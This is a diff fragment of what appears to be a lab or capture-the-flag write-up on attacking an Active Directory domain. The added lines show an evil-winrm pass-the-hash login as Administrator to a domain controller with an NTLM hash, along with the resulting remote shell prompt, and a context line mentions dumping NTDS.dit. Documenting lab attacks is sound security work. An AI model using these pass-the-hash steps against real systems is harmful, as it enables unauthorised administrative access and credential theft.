@@ -795,7 +795,16 @@ DC2$:des-cbc-md5:ea085794853da149
 I can then use the hash for DC1$ and dump the contents of NTDS.dit
 
 ```python
-
+evil-winrm -i dc1.dismay.hsm -u Administrator -H 'b20bd68c786d847c122ed2b1e8ab60b0'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
 ```
 
 
